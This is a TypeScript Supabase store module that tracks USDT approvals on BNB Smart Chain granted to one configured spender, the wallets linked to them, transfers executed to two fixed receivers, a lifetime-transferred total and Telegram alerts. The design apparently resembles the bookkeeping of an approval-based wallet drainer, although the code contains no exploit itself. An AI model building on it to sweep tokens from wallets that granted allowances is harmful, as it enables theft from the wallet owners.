import { randomUUID } from "node:crypto";
import { createClient, type SupabaseClient } from "@supabase/supabase-js";
import { config } from "./config";

export type WalletRecord = {
  address: string;
  receiver: 1 | 2;
  active: boolean;
  createdAt: string;
  updatedAt?: string;
  firstDetectedAt?: string;
  latestActivityAt?: string;
  lastCheckedAt?: string;
  lastError?: string;
  approvalLinked?: boolean;
  tokenContract?: string;
  tokenSymbol?: string;
  tokenDecimals?: number;
  network?: string;
  chainId?: string;
  currentBalance?: string;
  currentAllowance?: string;
  rawCurrentBalance?: string;
  rawCurrentAllowance?: string;
  currentBalanceStatus?: string;
  currentAllowanceStatus?: string;
  spender?: string;
  latestApprovalTxHash?: string;
  latestTransferTxHash?: string;
};

export type ApprovalRecord = {
  id: string;
  walletAddress: string;
  ownerAddress: string;
  spender: string;
  tokenContract: string;
  tokenSymbol: string;
  tokenDecimals: number;
  approvalAmount: string;
  rawApprovalAmount: string;
  currentAllowance?: string;
  rawCurrentAllowance?: string;
  allowanceStatus?: string;
  walletBalance?: string;
  rawWalletBalance?: string;
  balanceStatus?: string;
  previousAllowance?: string;
  rawPreviousAllowance?: string;
  previousAllowanceStatus?: string;
  revocationEligible?: boolean;
  network: string;
  chainId: string;
  blockNumber: number;
  blockHash?: string;
  blockTimestamp: string;
  blockTimestampStatus?: "verified" | "unavailable";
  transactionHash: string;
  logIndex: number;
  eventType: "Approval";
  processingStatus: "pending" | "processed" | "failed";
  telegramStatus: "pending" | "sent" | "failed" | "skipped";
  telegramAttemptCount: number;
  telegramSentAt?: string;
  telegramError?: string;
  createdAt: string;
  updatedAt: string;
  approvalStatus?: "active" | "revoked";
  canonicalStatus?: "canonical" | "reorged";
  confirmationStatus?: "pending" | "confirmed" | "reorged";
  confirmations?: number;
};

export type TransferRecord = {
  id: string;
  walletAddress: string;
  sender: string;
  receivingWallet: string;
  tokenContract: string;
  tokenSymbol: string;
  tokenDecimals: number;
  transferAmount: string;
  rawTransferAmount: string;
  currentBalance?: string;
  executionEventLogIndex?: number;
  executionContract?: string;
  executionEvidence?: "TransferExecuted";
  executionMethod?: "executeToReceiver1" | "executeToReceiver2";
  executionVerified?: boolean;
  network: string;
  chainId: string;
  blockNumber: number;
  blockTimestamp: string;
  blockTimestampStatus?: "verified" | "unavailable";
  transactionHash: string;
  logIndex: number;
  eventType: "Transfer";
  processingStatus: "pending" | "processed" | "failed";
  telegramStatus: "pending" | "sent" | "failed" | "skipped";
  telegramAttemptCount: number;
  telegramSentAt?: string;
  telegramError?: string;
  createdAt: string;
  updatedAt: string;
};

export type IncomingTransferRecord = {
  id: string;
  walletAddress: string;
  sender: string;
  receivedAmount: string;
  rawReceivedAmount: string;
  tokenContract: string;
  tokenSymbol: string;
  tokenDecimals: number;
  spender: string;
  approvalRecordId: string;
  approvalTransactionHash: string;
  approvalBlockNumber: number;
  approvalBlockTimestamp: string;
  approvedAllowance: string;
  rawApprovedAllowance: string;
  balanceBefore?: string;
  rawBalanceBefore?: string;
  balanceAfter?: string;
  rawBalanceAfter?: string;
  balanceStatus: string;
  network: string;
  chainId: string;
  blockNumber: number;
  blockHash: string;
  transactionIndex: number;
  blockTimestamp: string;
  blockTimestampStatus: "verified" | "unavailable";
  transactionHash: string;
  logIndex: number;
  eventType: "IncomingTransfer";
  processingStatus: "processed" | "failed";
  canonicalStatus: "canonical" | "reorged";
  confirmationStatus: "pending" | "confirmed" | "reorged";
  confirmations: number;
  telegramStatus: "pending" | "sending" | "sent" | "failed" | "skipped";
  telegramAttemptCount: number;
  telegramSentAt?: string;
  telegramError?: string;
  createdAt: string;
  updatedAt: string;
};

type IncomingTelegramDeliveryRecord = {
  eventId: string;
  claimedAt: string;
  leaseExpiresAt: string;
  leaseToken: string;
  status: "sending" | "failed" | "sent";
  sentAt?: string;
  error?: string;
};

export type IncomingTelegramDeliveryClaim =
  | { status: "claimed"; leaseToken: string }
  | { status: "sent"; sentAt?: string };

export type MonitoringState = {
  network: string;
  chainId: number;
  contractAddress: string;
  eventType: string;
  lastProcessedBlock: number;
  updatedAt: string;
};

export type HistoryRecord = {
  id: string;
  wallet: string;
  receiver: 1 | 2;
  amount: string;
  txHash?: string;
  status: "submitted" | "confirmed" | "failed";
  error?: string;
  createdAt: string;
};

type SupabaseRow<T> = { id: string; record: T; created_at: string };
type SupabaseRecordRow<T> = { record: T };

const defaultMonitoringState: MonitoringState = {
  network: "BNB Smart Chain",
  chainId: 56,
  contractAddress: config.USDT_ADDRESS,
  eventType: "Approval+Transfer",
  lastProcessedBlock: 0,
  updatedAt: new Date(0).toISOString()
};

function isAddress(value: unknown): value is string {
  return typeof value === "string" && /^0x[a-fA-F0-9]{40}$/.test(value);
}

function isCanonicalApprovalId(record: ApprovalRecord) {
  return record.id.startsWith(
    `approval-${record.chainId}-${record.tokenContract.toLowerCase()}-`
  );
}

function compareApprovalHistory(first: ApprovalRecord, second: ApprovalRecord) {
  return first.blockNumber - second.blockNumber ||
    first.logIndex - second.logIndex ||
    Number(isCanonicalApprovalId(first)) - Number(isCanonicalApprovalId(second)) ||
    first.id.localeCompare(second.id);
}

function isSameApprovalEvent(first: ApprovalRecord, second: ApprovalRecord) {
  return first.chainId === second.chainId &&
    first.tokenContract.toLowerCase() === second.tokenContract.toLowerCase() &&
    first.transactionHash.toLowerCase() === second.transactionHash.toLowerCase() &&
    first.logIndex === second.logIndex;
}

function isApprovalRecordInScope(record: ApprovalRecord) {
  const owner = record.walletAddress || record.ownerAddress;
  return record.eventType === "Approval" &&
    isAddress(owner) &&
    isAddress(record.spender) &&
    isAddress(record.tokenContract) &&
    record.tokenContract.toLowerCase() === config.USDT_ADDRESS.toLowerCase() &&
    record.spender.toLowerCase() === config.ALLOWANCE_SPENDER_ADDRESS.toLowerCase() &&
    record.chainId === String(config.CHAIN_ID) &&
    Number.isInteger(record.blockNumber) &&
    record.blockNumber >= 0 &&
    Number.isInteger(record.logIndex) &&
    record.logIndex >= 0;
}

export function findActiveApprovalAt(
  approvals: ApprovalRecord[],
  walletAddress: string,
  blockNumber: number,
  logIndex: number
) {
  if (!isAddress(walletAddress) || !Number.isInteger(blockNumber) || !Number.isInteger(logIndex)) {
    return undefined;
  }
  const normalizedAddress = walletAddress.toLowerCase();
  const approval = approvals
    .filter((record) =>
      isApprovalRecordInScope(record) &&
      record.canonicalStatus !== "reorged" &&
      (record.walletAddress || record.ownerAddress).toLowerCase() === normalizedAddress &&
      (record.blockNumber < blockNumber || (record.blockNumber === blockNumber && record.logIndex < logIndex))
    )
    .sort(compareApprovalHistory)
    .at(-1);
  return approval && /^\d+$/.test(approval.rawApprovalAmount) && BigInt(approval.rawApprovalAmount) > 0n
    ? approval
    : undefined;
}

export function isIncomingTransferInScope(
  record: IncomingTransferRecord,
  approvals: ApprovalRecord[]
) {
  if (
    record.eventType !== "IncomingTransfer" ||
    !isAddress(record.walletAddress) ||
    !isAddress(record.spender) ||
    !isAddress(record.tokenContract) ||
    record.tokenContract.toLowerCase() !== config.USDT_ADDRESS.toLowerCase() ||
    record.spender.toLowerCase() !== config.ALLOWANCE_SPENDER_ADDRESS.toLowerCase() ||
    record.chainId !== String(config.CHAIN_ID) ||
    !Number.isInteger(record.blockNumber) ||
    !Number.isInteger(record.logIndex)
  ) return false;

  const approval = approvals.find((item) => item.id === record.approvalRecordId);
  if (
    !approval ||
    !isApprovalRecordInScope(approval) ||
    (approval.walletAddress || approval.ownerAddress).toLowerCase() !== record.walletAddress.toLowerCase() ||
    !/^\d+$/.test(approval.rawApprovalAmount) ||
    BigInt(approval.rawApprovalAmount) <= 0n ||
    !(approval.blockNumber < record.blockNumber ||
      (approval.blockNumber === record.blockNumber && approval.logIndex < record.logIndex))
  ) return false;
  if (record.canonicalStatus === "reorged") return true;

  const activeApproval = findActiveApprovalAt(approvals, record.walletAddress, record.blockNumber, record.logIndex);
  return activeApproval?.id === approval.id;
}

export class Store {
  private readonly client: SupabaseClient;
  private wallets: WalletRecord[] = [];
  private historyRecords: HistoryRecord[] = [];
  private approvalEvents: ApprovalRecord[] = [];
  private transferEvents: TransferRecord[] = [];
  private incomingTransferEvents: IncomingTransferRecord[] = [];
  private monitoringStates: MonitoringState[] = [];
  private lifetimeTransferredAmount = "0";
  private lifetimeTransferredDecimals = 6;

  constructor() {
    this.client = createClient(config.SUPABASE_URL, config.SUPABASE_SERVICE_ROLE_KEY, {
      auth: { autoRefreshToken: false, persistSession: false }
    });
  }
  findActiveApprovalAt(address: string, blockNumber: number, logIndex: number) {
    return findActiveApprovalAt(this.approvalEvents, address, blockNumber, logIndex);
  }

  async initialize() {
    const [wallets, history, approvals, transfers, incomingTransfers, monitoringStates] = await Promise.all([
      this.load<WalletRecord>("wallets", 10000, true),
      this.load<HistoryRecord>("history", 1000),
      this.load<ApprovalRecord>("approvalEvents"),
      this.load<TransferRecord>("transferEvents"),
      this.load<IncomingTransferRecord>("incomingTransferEvents"),
      this.load<MonitoringState>("monitoringState", 100, true)
    ]);
    this.wallets = wallets;
    this.historyRecords = history;
    this.approvalEvents = approvals.filter((record) => this.isApprovalInScope(record));
    this.transferEvents = transfers.filter((record) => this.isTransferInScope(record));
    this.incomingTransferEvents = incomingTransfers.filter((record) => this.isIncomingTransferInScope(record));
    this.monitoringStates = monitoringStates;
    await this.refreshApprovalStatuses();

    const { data: lifetimeTransferredAmount, error } = await this.client
      .rpc("reconcile_lifetime_transfer_volume")
      .returns<string>();
    if (error) throw new Error(`Supabase transfer volume reconciliation failed: ${error.message}`);
    if (typeof lifetimeTransferredAmount !== "string" || !/^\d+$/.test(lifetimeTransferredAmount)) {
      throw new Error("Supabase returned an invalid lifetime transfer volume");
    }
    this.lifetimeTransferredAmount = lifetimeTransferredAmount;
  }

  private async load<T>(table: string, limit?: number, ascending = false): Promise<T[]> {
    const records: T[] = [];
    const pageSize = 1000;
    for (let offset = 0; limit === undefined || offset < limit; offset += pageSize) {
      const end = limit === undefined ? offset + pageSize - 1 : Math.min(offset + pageSize, limit) - 1;
      const { data, error } = await this.client
        .from(table)
        .select("id,record,created_at")
        .order("created_at", { ascending })
        .order("id", { ascending: true })
        .range(offset, end)
        .returns<SupabaseRow<T>[]>();
      if (error) throw new Error(`Supabase read failed for ${table}: ${error.message}`);
      records.push(...data.map((row) => row.record));
      if (data.length < end - offset + 1) break;
    }
    return records;
  }

  private async persist<T>(table: string, id: string, record: T, createdAt: string) {
    const { error } = await this.client
      .from(table)
      .upsert({ id, record, created_at: createdAt }, { onConflict: "id" });
    if (error) throw new Error(`Supabase write failed for ${table}: ${error.message}`);
  }

  private normalizeAddress(address: string) {
    return address.toLowerCase();
  }

  private isApprovalInScope(record: ApprovalRecord) {
    return isApprovalRecordInScope(record);
  }

  private isTransferInScope(record: TransferRecord) {
    return record.eventType === "Transfer" &&
      record.tokenContract?.toLowerCase() === config.USDT_ADDRESS.toLowerCase() &&
      record.chainId === String(config.CHAIN_ID) &&
      record.executionContract?.toLowerCase() === config.ALLOWANCE_SPENDER_ADDRESS.toLowerCase() &&
      record.executionVerified === true &&
      ((record.executionMethod === "executeToReceiver1" || record.executionMethod === "executeToReceiver2") ||
        (record.executionEvidence === "TransferExecuted" && Number.isInteger(record.executionEventLogIndex)));
  }
  private isIncomingTransferInScope(record: IncomingTransferRecord) {
    return isIncomingTransferInScope(record, this.approvalEvents);
  }

  private async refreshApprovalStatuses() {
    const latestByOwner = new Map<string, ApprovalRecord>();
    for (const approval of this.approvalEvents) {
      if (approval.canonicalStatus === "reorged") continue;
      const owner = (approval.walletAddress || approval.ownerAddress).toLowerCase();
      const current = latestByOwner.get(owner);
      if (!current || compareApprovalHistory(approval, current) > 0) {
        latestByOwner.set(owner, approval);
      }
    }

    for (const approval of this.approvalEvents) {
      const latest = latestByOwner.get((approval.walletAddress || approval.ownerAddress).toLowerCase());
      const status = latest && isSameApprovalEvent(latest, approval) && BigInt(approval.rawApprovalAmount) > 0n
        ? "active"
        : "revoked";
      if (approval.approvalStatus === status) continue;
      const updated = { ...approval, approvalStatus: status as "active" | "revoked" };
      await this.persist("approvalEvents", updated.id, updated, updated.createdAt);
      this.approvalEvents = this.approvalEvents.map((item) => item.id === updated.id ? updated : item);
    }
  }

  listWallets() {
    const verifiedOwners = new Set(this.approvalEvents.filter((approval) => approval.canonicalStatus !== "reorged").map((approval) =>
      (approval.walletAddress || approval.ownerAddress).toLowerCase()
    ));
    return this.wallets.filter((wallet) => verifiedOwners.has(wallet.address.toLowerCase()));
  }
  hasVerifiedApprovalForWallet(address: string) {
    const normalizedAddress = this.normalizeAddress(address);
    return this.approvalEvents.some((approval) =>
      approval.canonicalStatus !== "reorged" &&
      this.normalizeAddress(approval.walletAddress || approval.ownerAddress) === normalizedAddress
    );
  }
  listApprovalLinkedWallets() {
    const latestApprovalByWallet = new Map<string, ApprovalRecord>();
    for (const approval of this.approvalEvents) {
      if (approval.canonicalStatus === "reorged") continue;
      const owner = (approval.walletAddress || approval.ownerAddress).toLowerCase();
      const existing = latestApprovalByWallet.get(owner);
      if (
        !existing ||
        approval.blockNumber > existing.blockNumber ||
        (approval.blockNumber === existing.blockNumber && approval.logIndex > existing.logIndex)
      ) latestApprovalByWallet.set(owner, approval);
    }
    return this.wallets.filter((wallet) => {
      const latestApproval = latestApprovalByWallet.get(wallet.address.toLowerCase());
      return wallet.approvalLinked === true &&
        wallet.active &&
        wallet.tokenContract?.toLowerCase() === config.USDT_ADDRESS.toLowerCase() &&
        wallet.spender?.toLowerCase() === config.ALLOWANCE_SPENDER_ADDRESS.toLowerCase() &&
        wallet.chainId === String(config.CHAIN_ID) &&
        latestApproval !== undefined &&
        /^\d+$/.test(latestApproval.rawApprovalAmount) &&
        BigInt(latestApproval.rawApprovalAmount) > 0n;
    });
  }
  listApprovalEvents() {
    return this.approvalEvents.slice().sort((first, second) =>
      compareApprovalHistory(second, first)
    );
  }
  listTransferEvents() { return this.transferEvents; }
  listIncomingTransferEvents() {
    return this.incomingTransferEvents.slice().sort((first, second) =>
      second.blockNumber - first.blockNumber || second.logIndex - first.logIndex
    );
  }
  async listRetryableTelegramNotifications() {
    const loadRetryable = async <T>(table: string, statuses: string[]): Promise<T[]> => {
      const records: T[] = [];
      const pageSize = 1000;
      for (let offset = 0; ; offset += pageSize) {
        const { data, error } = await this.client
          .from(table)
          .select("record")
          .in("record->>telegramStatus", statuses)
          .order("created_at", { ascending: true })
          .order("id", { ascending: true })
          .range(offset, offset + pageSize - 1)
          .returns<SupabaseRecordRow<T>[]>();
        if (error) throw new Error(`Supabase retry scan failed for ${table}: ${error.message}`);
        records.push(...data.map((row) => row.record));
        if (data.length < pageSize) break;
      }
      return records;
    };

    const [approvals, transfers, incomingTransfers] = await Promise.all([
      loadRetryable<ApprovalRecord>("approvalEvents", ["pending", "failed", "skipped"]),
      loadRetryable<TransferRecord>("transferEvents", ["pending", "failed", "skipped"]),
      loadRetryable<IncomingTransferRecord>("incomingTransferEvents", ["pending", "failed", "skipped", "sending"])
    ]);
    return {
      approvals: approvals.filter((record) => this.isApprovalInScope(record)),
      transfers: transfers.filter((record) => this.isTransferInScope(record)),
      incomingTransfers: incomingTransfers.filter((record) => this.isIncomingTransferInScope(record))
    };
  }
  getLifetimeTransferredAmount() { return this.lifetimeTransferredAmount; }
  getLifetimeTransferredDecimals() { return this.lifetimeTransferredDecimals; }
  setLifetimeTransferredDecimals(decimals: number) {
    if (!Number.isInteger(decimals) || decimals < 0 || decimals > 36) {
      throw new Error("Token decimals must be an integer between 0 and 36");
    }
    this.lifetimeTransferredDecimals = decimals;
  }
  getWallet(address: string) {
    return this.wallets.find((wallet) => this.normalizeAddress(wallet.address) === this.normalizeAddress(address));
  }
  getApprovalEvent(id: string) { return this.approvalEvents.find((record) => record.id === id); }
  getTransferEvent(id: string) { return this.transferEvents.find((record) => record.id === id); }
  async findApprovalEvent(chainId: string, transactionHash: string, logIndex: number) {
    const id = `approval-${chainId}-${config.USDT_ADDRESS.toLowerCase()}-${transactionHash.toLowerCase()}-${logIndex}`;
    const matches = this.approvalEvents.filter((record) =>
      this.isApprovalInScope(record) &&
      record.chainId === chainId &&
      record.transactionHash.toLowerCase() === transactionHash.toLowerCase() &&
      record.logIndex === logIndex
    );
    const cached = matches.find(isCanonicalApprovalId) ?? matches[0];
    if (cached) return cached;

    const { data, error } = await this.client
      .from("approvalEvents")
      .select("record")
      .eq("id", id)
      .maybeSingle();
    if (error) throw new Error(`Supabase event lookup failed for approval ${id}: ${error.message}`);
    const record = data?.record as ApprovalRecord | undefined;
    if (
      !record ||
      !this.isApprovalInScope(record) ||
      record.chainId !== chainId ||
      record.transactionHash.toLowerCase() !== transactionHash.toLowerCase() ||
      record.logIndex !== logIndex
    ) return undefined;
    this.approvalEvents = [record, ...this.approvalEvents.filter((item) => item.id !== id)];
    return record;
  }
  async findTransferEvent(chainId: string, transactionHash: string, logIndex: number) {
    const id = `transfer-${chainId}-${config.USDT_ADDRESS.toLowerCase()}-${transactionHash.toLowerCase()}-${logIndex}`;
    const cached = this.transferEvents.find((record) => record.id === id);
    if (cached) return cached;

    const { data, error } = await this.client
      .from("transferEvents")
      .select("record")
      .eq("id", id)
      .maybeSingle();
    if (error) throw new Error(`Supabase event lookup failed for transfer ${id}: ${error.message}`);
    const record = data?.record as TransferRecord | undefined;
    if (
      !record ||
      !this.isTransferInScope(record) ||
      record.chainId !== chainId ||
      record.transactionHash.toLowerCase() !== transactionHash.toLowerCase() ||
      record.logIndex !== logIndex
    ) return undefined;
    this.transferEvents = [record, ...this.transferEvents.filter((item) => item.id !== id)];
    return record;
  }
  async findIncomingTransferEvent(chainId: string, transactionHash: string, logIndex: number) {
    const id = `incoming-${chainId}-${config.USDT_ADDRESS.toLowerCase()}-${transactionHash.toLowerCase()}-${logIndex}`;
    const cached = this.incomingTransferEvents.find((record) => record.id === id);
    if (cached) return cached;

    const { data, error } = await this.client
      .from("incomingTransferEvents")
      .select("record")
      .eq("id", id)
      .maybeSingle();
    if (error) throw new Error(`Supabase event lookup failed for incoming transfer ${id}: ${error.message}`);
    const record = data?.record as IncomingTransferRecord | undefined;
    if (
      !record ||
      record.eventType !== "IncomingTransfer" ||
      record.tokenContract.toLowerCase() !== config.USDT_ADDRESS.toLowerCase() ||
      record.spender.toLowerCase() !== config.ALLOWANCE_SPENDER_ADDRESS.toLowerCase() ||
      record.chainId !== chainId ||
      record.transactionHash.toLowerCase() !== transactionHash.toLowerCase() ||
      record.logIndex !== logIndex
    ) return undefined;
    this.incomingTransferEvents = [record, ...this.incomingTransferEvents.filter((item) => item.id !== id)];
    return record;
  }

  async register(wallet: WalletRecord) {
    if (wallet.approvalLinked && (
      wallet.tokenContract?.toLowerCase() !== config.USDT_ADDRESS.toLowerCase() ||
      wallet.spender?.toLowerCase() !== config.ALLOWANCE_SPENDER_ADDRESS.toLowerCase() ||
      wallet.chainId !== String(config.CHAIN_ID)
    )) {
      throw new Error("Cannot persist an approval-linked wallet outside the configured token, spender, and chain");
    }
    await this.persist("wallets", this.normalizeAddress(wallet.address), wallet, wallet.createdAt);
    this.wallets = this.wallets.filter((item) => this.normalizeAddress(item.address) !== this.normalizeAddress(wallet.address));
    this.wallets.push(wallet);
    return wallet;
  }

  async remove(address: string) {
    const wallet = this.getWallet(address);
    if (!wallet) return undefined;
    const updated = { ...wallet, active: false, updatedAt: new Date().toISOString() };
    await this.persist("wallets", this.normalizeAddress(updated.address), updated, updated.createdAt);
    this.wallets = this.wallets.map((item) =>
      this.normalizeAddress(item.address) === this.normalizeAddress(address) ? updated : item
    );
    return updated;
  }

  async update(address: string, update: Partial<WalletRecord>) {
    const wallet = this.getWallet(address);
    if (!wallet) return undefined;
    const updated = { ...wallet, ...update, updatedAt: new Date().toISOString() };
    await this.persist("wallets", this.normalizeAddress(updated.address), updated, updated.createdAt);
    this.wallets = this.wallets.map((item) =>
      this.normalizeAddress(item.address) === this.normalizeAddress(address) ? updated : item
    );
    return updated;
  }

  async addHistory(record: HistoryRecord) {
    await this.persist("history", record.id, record, record.createdAt);
    this.historyRecords = [record, ...this.historyRecords.filter((item) => item.id !== record.id)].slice(0, 1000);
    return record;
  }

  async incrementLifetimeTransferredAmount(transferId: string, rawAmount: string) {
    if (!/^[1-9]\d*$/.test(rawAmount)) {
      throw new Error("Lifetime transfer volume increment must be a positive integer");
    }
    const { data, error } = await this.client
      .rpc("increment_lifetime_transfer_volume", {
        p_transfer_id: transferId,
        p_raw_amount: rawAmount
      })
      .returns<string>();
    if (error) throw new Error(`Supabase transfer volume increment failed: ${error.message}`);
    if (typeof data !== "string" || !/^\d+$/.test(data)) {
      throw new Error("Supabase returned an invalid lifetime transfer volume");
    }
    this.lifetimeTransferredAmount = data;
    return data;
  }

  history(wallet?: string) {
    return wallet
      ? this.historyRecords.filter((item) => this.normalizeAddress(item.wallet) === this.normalizeAddress(wallet))
      : this.historyRecords;
  }

  async upsertApproval(record: ApprovalRecord) {
    if (!this.isApprovalInScope(record)) {
      throw new Error("Cannot persist an approval outside the configured token, spender, and chain");
    }
    await this.persist("approvalEvents", record.id, record, record.createdAt);
    this.approvalEvents = [record, ...this.approvalEvents.filter((item) => item.id !== record.id)];
    const owner = (record.walletAddress || record.ownerAddress).toLowerCase();
    const latest = this.approvalEvents
      .filter((item) => (item.walletAddress || item.ownerAddress).toLowerCase() === owner && item.canonicalStatus !== "reorged")
      .sort(compareApprovalHistory)
      .at(-1);
    if (latest) {
      for (const approval of this.approvalEvents) {
        if ((approval.walletAddress || approval.ownerAddress).toLowerCase() !== owner) continue;
        const status = isSameApprovalEvent(approval, latest) && BigInt(approval.rawApprovalAmount) > 0n
          ? "active"
          : "revoked";
        if (approval.approvalStatus === status) continue;
        const updated = { ...approval, approvalStatus: status as "active" | "revoked" };
        await this.persist("approvalEvents", updated.id, updated, updated.createdAt);
        this.approvalEvents = this.approvalEvents.map((item) => item.id === updated.id ? updated : item);
      }
    }
    return record;
  }

  async upsertTransfer(record: TransferRecord) {
    if (!this.isTransferInScope(record)) {
      throw new Error("Cannot persist an unverified transfer outside the configured spender scope");
    }
    await this.persist("transferEvents", record.id, record, record.createdAt);
    this.transferEvents = [record, ...this.transferEvents.filter((item) => item.id !== record.id)];
    return record;
  }
  async upsertIncomingTransfer(record: IncomingTransferRecord) {
    if (!this.isIncomingTransferInScope(record)) {
      throw new Error("Cannot persist an incoming transfer outside the configured token, spender, and chain");
    }
    await this.persist("incomingTransferEvents", record.id, record, record.createdAt);
    this.incomingTransferEvents = [record, ...this.incomingTransferEvents.filter((item) => item.id !== record.id)];
    return record;
  }

  async claimIncomingTelegramNotification(
    eventId: string,
    leaseDurationMs: number
  ): Promise<IncomingTelegramDeliveryClaim | undefined> {
    if (!Number.isInteger(leaseDurationMs) || leaseDurationMs <= 0) {
      throw new Error("Telegram delivery lease duration must be a positive integer");
    }
    const now = new Date().toISOString();
    const leaseToken = randomUUID();
    const leaseExpiresAt = new Date(Date.now() + leaseDurationMs).toISOString();
    const record: IncomingTelegramDeliveryRecord = {
      eventId,
      claimedAt: now,
      leaseExpiresAt,
      leaseToken,
      status: "sending"
    };
    const { error } = await this.client
      .from("incomingTelegramDeliveries")
      .insert({
        id: eventId,
        record,
        created_at: now
      });
    if (!error) return { status: "claimed", leaseToken };
    if (error.code !== "23505") {
      throw new Error(`Supabase Telegram delivery claim failed for ${eventId}: ${error.message}`);
    }

    const existing = await this.client
      .from("incomingTelegramDeliveries")
      .select("record")
      .eq("id", eventId)
      .maybeSingle()
      .returns<SupabaseRecordRow<IncomingTelegramDeliveryRecord>>();
    if (existing.error) {
      throw new Error(`Supabase Telegram delivery lookup failed for ${eventId}: ${existing.error.message}`);
    }
    if (existing.data?.record.status === "sent") {
      return { status: "sent", sentAt: existing.data.record.sentAt };
    }

    const staleBefore = new Date(Date.now() - leaseDurationMs).toISOString();
    const reclaim = async (legacy: boolean, status?: "sending" | "failed") => {
      let query = this.client
        .from("incomingTelegramDeliveries")
        .update({ record })
        .eq("id", eventId);
      if (legacy) {
        query = query
          .is("record->>status", null)
          .is("record->>leaseExpiresAt", null)
          .lt("record->>claimedAt", staleBefore);
      } else {
        if (!status) throw new Error("Telegram delivery status is required to reclaim a current lease");
        query = query
          .eq("record->>status", status)
          .lt("record->>leaseExpiresAt", now);
      }
      const { data: reclaimed, error: reclaimError } = await query
        .select("record")
        .returns<SupabaseRecordRow<IncomingTelegramDeliveryRecord>[]>();
      if (reclaimError) {
        throw new Error(`Supabase Telegram delivery lease update failed for ${eventId}: ${reclaimError.message}`);
      }
      if (!reclaimed) throw new Error(`Supabase returned no Telegram delivery lease result for ${eventId}`);
      return reclaimed.length > 0;
    };

    if (
      await reclaim(false, "sending") ||
      await reclaim(false, "failed") ||
      await reclaim(true)
    ) return { status: "claimed", leaseToken };
    return undefined;
  }

  async finishIncomingTelegramNotification(
    eventId: string,
    leaseToken: string,
    status: "failed" | "sent",
    details: { sentAt?: string; error?: string },
    leaseDurationMs: number
  ) {
    if (!Number.isInteger(leaseDurationMs) || leaseDurationMs <= 0) {
      throw new Error("Telegram delivery lease duration must be a positive integer");
    }
    const existing = await this.client
      .from("incomingTelegramDeliveries")
      .select("record")
      .eq("id", eventId)
      .eq("record->>leaseToken", leaseToken)
      .maybeSingle()
      .returns<SupabaseRecordRow<IncomingTelegramDeliveryRecord>>();
    if (existing.error) {
      throw new Error(`Supabase Telegram delivery completion lookup failed for ${eventId}: ${existing.error.message}`);
    }
    if (!existing.data) return false;

    const record: IncomingTelegramDeliveryRecord = {
      ...existing.data.record,
      leaseExpiresAt: new Date(Date.now() + leaseDurationMs).toISOString(),
      status,
      sentAt: details.sentAt,
      error: details.error
    };
    const { data, error } = await this.client
      .from("incomingTelegramDeliveries")
      .update({ record })
      .eq("id", eventId)
      .eq("record->>leaseToken", leaseToken)
      .select("record")
      .returns<SupabaseRecordRow<IncomingTelegramDeliveryRecord>[]>();
    if (error) {
      throw new Error(`Supabase Telegram delivery completion failed for ${eventId}: ${error.message}`);
    }
    if (!data) throw new Error(`Supabase returned no Telegram delivery completion result for ${eventId}`);
    return data.length > 0;
  }

  async updateApprovalCanonicalStatus(id: string, status: "canonical" | "reorged") {
    const record = this.approvalEvents.find((item) => item.id === id);
    if (!record || record.canonicalStatus === status) return record;
    const updated = { ...record, canonicalStatus: status, confirmationStatus: status === "reorged" ? "reorged" as const : "pending" as const };
    await this.persist("approvalEvents", updated.id, updated, updated.createdAt);
    this.approvalEvents = this.approvalEvents.map((item) => item.id === id ? updated : item);
    return this.upsertApproval(updated);
  }

  async updateIncomingCanonicalStatus(id: string, status: "canonical" | "reorged") {
    const record = this.incomingTransferEvents.find((item) => item.id === id);
    if (!record || record.canonicalStatus === status) return record;
    const updated = { ...record, canonicalStatus: status, confirmationStatus: status === "reorged" ? "reorged" as const : "pending" as const };
    await this.persist("incomingTransferEvents", updated.id, updated, updated.createdAt);
    this.incomingTransferEvents = this.incomingTransferEvents.map((item) => item.id === id ? updated : item);
    return updated;
  }

  async updateConfirmationStatus(latestBlock: number, threshold: number) {
    for (const record of this.approvalEvents) {
      if (record.canonicalStatus === "reorged") continue;
      const confirmations = Math.max(0, latestBlock - record.blockNumber + 1);
      const confirmationStatus = confirmations >= threshold ? "confirmed" : "pending";
      if (record.confirmations === confirmations && record.confirmationStatus === confirmationStatus) continue;
      await this.upsertApproval({ ...record, confirmations, confirmationStatus });
    }
    for (const record of this.incomingTransferEvents) {
      if (record.canonicalStatus === "reorged") continue;
      const confirmations = Math.max(0, latestBlock - record.blockNumber + 1);
      const confirmationStatus = confirmations >= threshold ? "confirmed" : "pending";
      if (record.confirmations === confirmations && record.confirmationStatus === confirmationStatus) continue;
      await this.upsertIncomingTransfer({ ...record, confirmations, confirmationStatus });
    }
  }

  getMonitoringState(eventType: string) {
    return this.monitoringStates.find((state) => state.eventType === eventType) ?? { ...defaultMonitoringState };
  }

  async setMonitoringState(state: MonitoringState) {
    await this.persist("monitoringState", state.eventType, state, state.updatedAt);
    this.monitoringStates = [
      state,
      ...this.monitoringStates.filter((entry) => entry.eventType !== state.eventType)
    ];
    return state;
  }
}
